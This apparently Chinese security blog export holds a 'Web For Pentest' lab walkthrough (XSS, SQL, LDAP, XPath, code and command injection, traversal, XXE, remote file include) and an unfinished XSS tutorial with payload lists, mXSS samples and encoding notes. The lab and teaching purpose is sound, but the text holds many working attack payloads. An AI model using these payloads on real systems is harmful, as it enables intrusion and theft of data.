1http://172.16.71.152/xss/example6.php?name=%22;alert(1)// Example 71http://172.16.71.152/xss/example7.php?name=hacker 用&lt;script&gt;alert(1)&lt;/script&gt;测试，发现输入变成了 1234Hello &lt;script&gt; var $a= '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;';&lt;/script&gt; 依然可以闭合单引号，注释后面即可。 1http://172.16.71.152/xss/example7.php?name=%27;alert(1)// Example 8发现这关有个输入框，提交&lt;script&gt;alert(1)&lt;/script&gt;，发现返回了实体编码 123HELLO &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;form action=\"/xss/example8.php\" method=\"POST\"&gt; Your name:&lt;input type=\"text\" name=\"name\" /&gt; &lt;input type=\"submit\" name=\"submit\"/&gt; 尝试了一些特殊字符 123()/'\";&lt;&gt;`HELLO ()/'&amp;quot;;&amp;lt;&amp;gt;` 发现&lt;&gt;被过滤了，但是输出结果又没有处于任何一个标签的属性之内，感觉没有什么攻击点，查看源代码 123if(isset($_POST['name'])){ echo \"HELLO \".htmlentities($_POST['name']);} 确实用了htmlentities，但是感觉在输出又处在内容当中，真的没什么利用的点，找了一波也没发现什么有用的利用姿势，最后看文档，才知道攻击点并不在这，而是在后面的代码中 123&lt;form action=\"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;\" method=\"POST\"&gt; Your name:&lt;input type=\"text\" name=\"name\" /&gt; &lt;input type=\"submit\" name=\"submit\"/&gt; 问题就出现在&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;这里 ​ ‘PHP_SELF’ 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 /foo/bar.php。FILE 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 我们可以看到，这里是获取执行脚本的文件名，我们可以有xss/example8.php/%3C，返回 1&lt;form action=\"/xss/example8.php/&lt;\" method=\"POST\"&gt; 说明PHP_SELF是可控的，而且又存在在action属性中，于是我们可以有，直接闭合form，然后直接 x 1\"&gt;&lt;script&gt;alert(1);&lt;/script&gt;// Example 91http://172.16.71.152/xss/example9.php#hacker 发现页面有 123&lt;script&gt; document.write(location.hash.substring(1));&lt;/script&gt; 一个 DOM 型的 XSS ，讲道理应该可以直接使用#&lt;script&gt;alert(1)&lt;/script&gt;来进行 xss ，但是…不知道是不是浏览器的问题，直接就给我把&lt;&gt;进行 url 编码了… File IncludeExample 1直接用 12php://filter/read=convert.base64-encode/resource=intro.phpphp://filter/read=convert.base64-encode/resource=example1.php 得到源码 1234567&lt;?php require_once '../header.php'; ?&gt;&lt;?phptrueif ($_GET[\"page\"]) {truetrueinclude($_GET[\"page\"]);true} ?&gt;&lt;?php require_once '../footer.php'; ?&gt; 但是官方的意思是让我们体验一下远程包含的感觉… 1http://172.16.71.152/fileincl/example1.php?page=http://your_ip/zedd.txt Zedd.txt 中的内容为 12&lt;?php phpinfo(); 得到 Example 2比上面少个后缀 12php://filter/read=convert.base64-encode/resource=introphp://filter/read=convert.base64-encode/resource=example2 读取源代码 1234567891011&lt;?php require_once '../header.php'; ?&gt;&lt;?phptrueif ($_GET[\"page\"]) { $file = $_GET[\"page\"].\".php\"; // simulate null byte issue $file = preg_replace('/\\x00.*/',\"\",$file);truetrueinclude($file);true} ?&gt;&lt;?php require_once '../footer.php'; ?&gt; 我们可以利用zedd.txt%00来绕过 LDAP attacksExample 1着实没看懂这个 Example 是什么鬼… ​ In this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid. However, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the bind with 2 null values, you will need to completely remove this parameter from the query. If you keep something like username=&amp;password= in the URL, these values will not work, since they won’t be null; instead, they will be empty. 菜是越来越菜，整个意思就是说可以用空值绕过，就是直接访问http://172.16.71.152/ldap/example1.php即可… Example 2按照 Example 1 的套路，先直接访问看看，发现返回 1Notice: Undefined index: password in /var/www/ldap/example2.php on line 9 Notice: Undefined index: name in /var/www/ldap/example2.php on line 10 UNAUTHENTICATED 看来是个正经的注入题了， 1234567891011121314151617181920212223242526272829&lt;?php require \"../header.php\" ; $ld = ldap_connect(\"localhost\") or die(\"Could not connect to LDAP server\"); ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3); ldap_set_option($ld, LDAP_OPT_REFERRALS, 0); if ($ld) { $lb = @ldap_bind($ld, \"cn=admin,dc=pentesterlab,dc=com\", \"pentesterlab\"); if ($lb) { $pass = \"{MD5}\".base64_encode(pack(\"H*\",md5($_GET['password']))); $filter = \"(&amp;(cn=\".$_GET['name'].\")(userPassword=\".$pass.\"))\"; if (!($search=@ldap_search($ld, \"ou=people,dc=pentesterlab,dc=com\", $filter))) { echo(\"Unable to search ldap server&lt;br&gt;\"); echo(\"msg:'\".ldap_error($ld).\"'&lt;/br&gt;\"); } else { $number_returned = ldap_count_entries($ld,$search); $info = ldap_get_entries($ld, $search); if ($info[\"count\"] &lt; 1) { //NOK echo \"UNAUTHENTICATED\"; } else { echo \"AUTHENTICATED as\"; echo(\" \".htmlentities($info[0]['uid'][0])); } } } } require \"../footer.php\" ; ?&gt; 折腾了挺久，这里直接看源码，我们对着分析，因为password处是被md5处理了，所以后面我们没办法注入，这里他执行两条以上的语句会直接报错Bad search filter，不能像网上给的大多数 payload 一样直接执行，所以我们需要分析一下，可以在name处闭合前面的括号，再用%00截断后面的即可， 1admin)(cn=admin))%00&amp;password=hacker 也可以不用后面那个cn=admin 1admin))%00&amp;password=hacker 不过我看文档写的有一处 fuzz 还是比较好的： 首先先用name=hacker&amp;password=hacker，回显正常 接着用name=hack*&amp;password=hacker，回显也正常 尝试name=hacker&amp;password=hack*，不能认证 尝试name=hack*&amp;password=hack*，不能认证 从这里可以推断，password处可能是经过了 Hash 或者一些什么操作，我们的注入点只能在username处 SQL InjectionExample 11root' or 1=1%23 没啥好说的 Example 2尝试root' or 1=1%23，返回 1ERROR NO SPACE 直接用%0a绕 1root'%0Aor%0A1=1%23 Example 3%0a还是返回了 1ERROR NO SPACE 用%a0绕 1root%27%A0or%A01=1%23 Example 41http://172.16.71.152/sqli/example4.php?id=2 这里参数变成了 id ，猜测是整形注入 12 or 1=1%23 Example 5依旧可以使用2 or 1=1%23注入 看了一下代码 123456if (!preg_match('/^[0-9]+/', $_GET[\"id\"])) { die(\"ERROR INTEGER REQUIRED\"); }$sql = \"SELECT * FROM users where id=\";$sql .= $_GET[\"id\"] ;$result = mysql_query($sql); 只要开头是数字就可以绕过了 Example 6尝试2 or 1=1%23，返回 1ERROR INTEGER REQUIRED 尝试2 or 1=1，发现全部返回，猜测检测开头结尾是否为数字，于是我们可以使用布尔盲注 1if(substr((SELECT group_concat(schema_name) from information_schema.schemata),1,1)='i',1,0) and 1 结果发现可以直接在注释后加数字就好了2 or 1=1 %23 1，而且之前猜列数为 3 ，也猜错了…orz 还是不够细心，通过1 union select 1,2,3,4,5%23 1，得到 5 列 123456789101112131 union SELECT 1,group_concat(schema_name),3,4,5 from information_schema.schemata %23 1information_schema,exercises1 union SELECT 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema='exercises' %23 1users1 union SELECT 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users'%23 1id,name,age,groupid,passwd1 union select * from users %23 1 Example 7查看源代码 1234567if (!preg_match('/^-?[0-9]+$/m', $_GET[\"id\"])) { die(\"ERROR INTEGER REQUIRED\"); }$sql = \"SELECT * FROM users where id=\";$sql .= $_GET[\"id\"];$result = mysql_query($sql); 我们可以用%0a(换行)绕过纯数字匹配，4%0Aor 1=1%23 11%0a union SELECT 1,group_concat(schema_name),3,4,5 from information_schema.schemata %23 Example 81http://172.16.71.152/sqli/example8.php?order=name 很明显的一个order注入，尝试报错无回显，那就只能通过 bool 注入或者延时注入了，但是 fuzz 了很久，都无法绕过，最后看源代码发现用的是反引号… 12$sql = \"SELECT * FROM users ORDER BY `\";$sql .= mysql_real_escape_string($_GET[\"order\"]).\"`\"; 用 sqlmap 跑了一下，发现可以用 12order=name`=`name` AND SLEEP(5) AND `name`=`nameorder=name`=`name` AND 2137=(SELECT (CASE WHEN (2137=2137) THEN 2137 ELSE (SELECT 8927 UNION SELECT 4832) END))-- lMKk 成功延时，仔细分析，其实是构成了以下 payload 123SELECT * FROM users ORDER BY `name`=`name` AND SLEEP(5) AND `name`=`name`;SELECT * FROM users ORDER BY `name`=`name` AND 2137=(SELECT (CASE WHEN (2137=2137) THEN 2137 ELSE (SELECT 8927 UNION SELECT 4832) END))-- lMKk` 这样就看的比较明朗了，其实就是用两个字符串先进行相等，然后还是用的是order by后注入的方式 Example 9比上个还要简单，直接测的是rand(true)%23，发现排序发生变化，于是就可以用 bool 注入了，就不再重复了。 Code injectionExample 11http://172.16.71.152/codeexec/example1.php?name=hacker 回显 1Hello hacker!!! 尝试 xss 1http://172.16.71.152/codeexec/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E// 成功alert，没发现这题问题所在，讲道理这算是个 HTML 代码注入吧2333，尝试注入$a，发现有回显 1Notice: Undefined variable: a in /var/www/codeexec/example1.php(6) : eval()'d code on line 1 Hello !!! 说明应该在eval()函数中，猜测是eval(echo \"$a!!!\")这样的方式，闭合双引号即可， 1\";system('whoami');echo \" Example 21http://172.16.71.152/codeexec/example2.php?order=id 传入$id，发现错误回显 1Notice: Undefined variable: id in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Fatal error: Cannot access empty property in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 这个比较头大，我们直接分析源代码 12345678910111213141516171819202122&lt;?phpclass User{ public $id, $name, $age; function __construct($id, $name, $age){ $this-&gt;name= $name; $this-&gt;age = $age; $this-&gt;id = $id; } } require_once('../header.php'); require_once('../sqli/db.php');true$sql = \"SELECT * FROM users \";true$order = $_GET[\"order\"];true$result = mysql_query($sql); if ($result) {truetruewhile ($row = mysql_fetch_assoc($result)) { $users[] = new User($row['id'],$row['name'],$row['age']); } if (isset($order)) { usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');')); } 这里用到了create_function的一个 trick ，可以用}闭合create_function，所以我们可以用 1id,$b-&gt;id);}system('ls');// Example 31http://172.16.71.152/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer 这里我们直接看代码算了… 12&lt;?phptrueecho preg_replace($_GET[\"pattern\"], $_GET[\"new\"], $_GET[\"base\"]); 1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 使用/e修饰符，preg_replace会将replacement参数当作 PHP 代码执行，也就是$_GET['new'] 所以用new=system('id');&amp;pattern=/test/e&amp;base=jutst test，即可执行任意命令。 File UploadExample 1毫无过滤的文件上传 Example 2使用.php3进行后缀绕过 Directory traversalExample 11http://172.16.71.152/dirtrav/example1.php?file=../../../../../../../../../../etc/passwd Example 21http://172.16.71.152/dirtrav/example2.php?file=/var/www/files/hacker.png 直接访问/etc/passwd不行，用../绕过 1http://172.16.71.152/dirtrav/example2.php?file=/var/www/files/../../../../../../../../../etc/passwd Example 31http://172.16.71.152/dirtrav/example3.php?file=hacker 猜测结尾有附加.jpg，用%00截断 1http://172.16.71.152/dirtrav/example3.php?file=../../../../../../../etc/passwd%00 Commands injectionExample 11http://172.16.71.152/commandexec/example1.php?ip=127.0.0.1 加;id执行命令 Example 2用;发现回显 1Invalid IP address 于是用%0a换行执行命令 Example 3直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了 看下源代码 123456&lt;?php if (!(preg_match('/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}.\\d{1,3}$/', $_GET['ip']))) { header(\"Location: example3.php?ip=127.0.0.1\"); } system(\"ping -c 2 \".$_GET['ip']);?&gt; 果然直接被跳转了，但是我们用 burp 还是可以直接执行的 XML attacksExample 11http://172.16.71.152/xml/example1.php?xml=%3Ctest%3Ehacker%3C/test%3E 没什么过滤的 xxe ，删掉下载的空格换行什么的就好了，记得 urlencode 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; Example 21http://172.16.71.152/xml/example2.php?name=hacker 看源码得到 1234567891011&lt;?php require_once(\"../header.php\"); $x = \"&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;\"; $xml=simplexml_load_string($x); $xpath = \"users/user/name[.='\".$_GET['name'].\"']/parent::*/message\"; $res = ($xml-&gt;xpath($xpath)); while(list( ,$node) = each($res)) { echo $node; } ?&gt; 看到源码就知道是一个 xpath 注入了，比较类似 sql 注入，用or 1=1的方式绕过即可 1users/user/name[.='hacker' or '1'='1']/parent::*/message 获取到了 1Hello hackerHello admin 用admin' and '1'='1得到 admin 的认证 Conclusion总结以下还是有点收获的，比如create_function那里的绕过，还有 LDAP 注入以及 XPath 注入， SQL 注入那里也有点收获，比如反引号的利用，也对order by注入有了更好的理解。","link":"/2019/03/08/Web-For-Pentest/"},{"title":"Web安全从零开始-XSS I","text":"这是自己写的 Web 安全从零开始系列之 XSS 篇。原本想一篇讲完，结果发现实在太多了，实在讲不完，就分篇来讲吧。第一篇讲解基本的 XSS 攻击，分类与编码，深入理解浏览器解析流程。 [TOC] What is XSS概述 ​ 跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 成因通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。 危害攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致 XSS 。 网络钓鱼，包括获取各类用户账号； 窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 易产生XSS的地方 数据交互的地方 get、post、cookies、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 数据输出的地方 用户资料 关键词、标签、说明 文件上传 Kinds of XSSReflected XSS Attacks介绍Reflected XSS Attacks 反射型 XSS 攻击，有些地方也称为非持续性 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。因为 payload 在触发时，是客户端渲染了服务器响应体，payload 经过了服务器，是与服务器产生了交互了的。 常见注入点网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。 攻击方式攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 Dom Based XSS Attacks介绍DOM(Document object model)，使用 DOM 能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互。 注入点通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。 攻击方式用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 Stored XSS Attacks介绍Stored XSS Attacks 持久型XSS，比反射型XSS更具有威胁性，并且可能影响到Web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。 常见注入点论坛、博客、留言板、网站的留言、评论、日志等交互处。 攻击方式攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 MXSS Attacks介绍不论是服务器端或客户端的XSS过滤器，都认定过滤后的HTML源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入。然而，如果用户所提供的富文本内容通过 javascript 代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进后发生意外变化（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation），而最终导致XSS的攻击流程，被称为突变XSS（mXSS, Mutation-based Cross-Site-Scripting）。 常见注入点反引号打破属性边界导致的 mXSSInput: 1&lt;img src=\"test.jpg\" alt =\"``onload=xss()\" /&gt; Output: 1&lt;IMG alt =``onload=xss() src =\"test.jpg\"&gt; 未知元素中的 xmlns 属性所导致的 mXSS一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。可以通过设置这些标签的xmlns 属性，让浏览器知道这些未知的标签是的XML命名空间是什么。但解释后却产生了突变： Input: 1&lt;pkav xmlns=\"&gt;&lt;iframe onload=alert(1)\"&gt;123&lt;/pkav&gt; Output: 1&lt;?XML:NAMESPACE PREFIX = [default] &gt;&lt;iframe onload=alert(1) NS = \"&gt;&lt;iframe onload=alert(1)\" /&gt;&lt;pkav xmlns=\"&gt;&lt;iframe onload=alert(1)\"&gt;123&lt;/pkav&gt; CSS中反斜线转义导致的mXSScss中允许使用\\来进行转义，但在在一起的时候，悲剧就产生了。 Input: 1&lt;p style=\"font-family:'ar\\27 \\3bx\\3a expression\\28xss\\28\\29\\29\\3bial';\"&gt;&lt;/p&gt; Output: 1&lt;P style=\"FONT-FAMILY: 'ar';x:xss());ial'\"&gt;&lt;/P&gt; CSS属性名中的转义所导致的mXSS\\22转义后产生的悲剧。 Input 1&lt;img src=1 style=\"font-fam\\22onerror\\3d alert\\28 1\\29\\20 ily:'aaa';\"&gt; Output 1&lt;IMG style=\"font-fam\"alert(1) ily: ''\" src=\"1\"&gt; Listing标签导致的mXSSListing标签里面的东东会发生些奇葩事情： Input 1&lt;listing&gt;&lt;img src=1 onerror=alert(1) &amp;&lt;/listing&gt; Output 1&lt;LISTING&gt;&lt;img src=1 onerror=alert(1) &gt;&lt;/LISTING&gt; UXSS介绍UXSS 全称 Universal Cross-Site Scripting，翻译过来就是通用型XSS，也叫Universal XSS。UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别： 不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。 俗的说，就是原来我们进行XSS攻击等都是针对Web应用本身，是因为Web应用本身存在漏洞才能被我们利用攻击；而UXSS不同的是通过浏览器或者浏览器扩展的漏洞来”制作XSS漏洞”，然后剩下的我们就可以像普通XSS那样利用攻击了。 详细参考通用跨站脚本攻击(UXSS) Payloadimg12345678&lt;img src=javascript:alert(\"xss\")&gt;&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr=\"URL\" style='Xss:expression(alert(/xss));'&lt;!--CSS标记xss--&gt;&lt;img STYLE=\"background-image:url(javascript:alert('XSS'))\"&gt;&lt;img src=\"x\" onerror=alert(1)&gt;&lt;img src=\"1\" onerror=eval(\"alert('xss')\")&gt;&lt;img src=1 onmouseover=alert('xss')&gt; a12345678&lt;a href=\"https://www.baidu.com\"&gt;baidu&lt;/a&gt;&lt;a href=\"javascript:alert('xss')\"&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=\"javascript:aaa\" onmouseover=\"alert(/xss/)\"&gt;aa&lt;/a&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;a href=\"\" onclick=alert('xss')&gt;aa&lt;/a&gt;&lt;a href=\"\" onclick=eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt; input1234&lt;input name=\"name\" value=\"\"&gt;&lt;input value=\"\" onclick=alert('xss') type=\"text\"&gt;&lt;input name=\"name\" value=\"\" onmouseover=prompt('xss') bad=\"\"&gt;&lt;input name=\"name\" value=\"\"&gt;&lt;script&gt;alert('xss')&lt;/script&gt; form12345&lt;form action=javascript:alert('xss') method=\"get\"&gt;&lt;form action=javascript:alert('xss')&gt;&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;&lt;form action=1 onmouseover=alert('xss)&gt; 利用编码 1234&lt;!--原code--&gt;&lt;form method=post action=\"data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;\"&gt;&lt;!--base64编码--&gt;&lt;form method=post action=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"&gt; iframe12345678&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;&lt;iframe src=\"data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;\"&gt;&lt;/iframe&gt;&lt;!--原code--&gt;&lt;iframe src=\"data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;\"&gt;&lt;!--base64编码--&gt;&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"&gt;&lt;iframe src=\"aaa\" onmouseover=alert('xss') /&gt;&lt;iframe&gt;&lt;iframe src=\"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;\"&gt;&lt;/iframe&gt; svg1&lt;svg onload=alert(1)&gt; sth else还有很多…这里只列举一些，因为标签就很多 EncodeFive Kinds Of HTML Elements 空元素(Void elements)，如&lt;area&gt;/&lt;br&gt;/&lt;base&gt;等等 原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt; RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt; 外部元素(Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素 基本元素(Normal elements)，即除了以上4种元素以外的元素 五类元素的区别如下： 空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 原始文本元素，可以容纳文本。 RCDATA元素，可以容纳文本和字符引用。 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释 基本元素，可以容纳文本、字符引用、其他元素和注释 URL Enocde一个百分号和该字符的 ASCII 编码所对应的2位十六进制数字，例如/的URL编码为 %2F (一般大写，但不强求) Character Entity在呈现 HTML 页面时，针对某些特殊字符如&lt;或&gt;直接使用，浏览器会误以为它们标签的开始或结束，若想正确的在 HTML 页面呈现特殊字符就需要用到其对应的字符实体。 字符实体是一个预先定义好的转义序列，它定义了一些无法在文本内容中输入的字符或符号。 而且比较重要的有： ​ 这里有三种情况可以容纳字符实体，”数据状态中的字符引用”，”RCDATA状态中的字符引用”和”属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&amp;#…”形式解码，对应的解码字符会被放入数据缓冲区中。 这里三种状态我们会在后面提到。 实体名称字符实体以&amp;开头 + 预先定义的实体名称，以分号结尾，如&lt;的编码为&amp;1t; 实体编号以&amp;开头 + #符号以及字符的十进制数字，如&lt;的实体编号为&amp;#60;，字符都是有实体编号的但有些字符没有实体名称。 Javascript Encode 三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\\145” 两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\\x65” 四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\\u0065” 对于一些控制字符，使用特殊的C类型的转义风格（例如\\n和\\r） jsfuck编码 CSS Encode用一个反斜线\\后面跟1~6位的十六进制数字，例如e可以编码为 \\65 或 65 或 00065 Javascript 内置的编码函数####String.fromCharCode 1String.fromCharCode(97,108,101,114,116) 这里是alert的编码 Render这部分强烈推荐仔细阅读Deep dive into browser parsing and XSS payload encoding，文章讲的很详细了，我这里浓缩一下。 原理览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。 首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。 浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。 三种状态数据状态中的字符引用1&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; 例如，在这个例子中，&lt;和&gt;字符被编码为&amp;#60;和&amp;#62;。 当解析器解析完&lt;div&gt;并处于“数据状态”时，这两个字符将会被解析。当解析器遇到&amp;字符，它会知道这是”数据状态的字符引用”，因此会消耗一个字符引用（例如&amp;#60;）并释放出对应字符的 token 。在这个例子中，对应字符指的是&lt;和&gt;。 你可能会想：这是不是意味着&lt;和&gt;的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到”标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成”数据”。 RCDATA 状态中的字符引用1&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; 这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”。这样就可以解释这段代码了。 另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入”RCDATA状态”。在这个状态中，如果遇到&lt;字符，它会转换到”RCDATA小于号状态”。如果&lt;字符后没有紧跟着/和对应的标签名，解析器会转换回”RCDATA状态”。这意味着在 RCDATA 元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是&lt;/textarea&gt;或者&lt;/title&gt;。当然，这要看开始标签是哪一个。因此，在&lt;textarea&gt;和&lt;title&gt;的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题中的脚本不会被执行。 我们来迅速看一下 CDATA 元素。任何在 CDATA 元素中的内容将不会触发解析器创建开始标签。闭合 CDATA 元素的标志是]]&gt;序列。因此如果用户想逃出 CDATA 元素，就要用未经任何编码的]]&gt;序列，不然是不会逃出 CDATA 元素的。 属性值状态中的字符引用123&lt;ahref=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29\"&gt; 在这个情况中字符引用会被解码。在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时， javascript 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 javascript 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题中的代码能够被执行。 Javascript 解析JavaScript解析过程与HTML解析过程有点不一样。 script 块有个有趣的属性：在块中的字符引用并不会被解析和解码。如果你去看“脚本数据状态”的状态转换规则，就会发现没有任何规则能转移到字符引用状态。所以如果攻击者尝试着将输入数据编码成字符实体并将其放在script 块中，它将不会被执行。 像\\uXXXX（例如\\u0000,\\u000A）这样的字符，JavaScript 会视情况而定解析这些字符来执行。具体的说就是要看被编码的序列到底是哪部分。首先，像\\uXXXX一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在3个部分：字符串中，标识符名称中和控制字符中。 字符串中当 Unicode 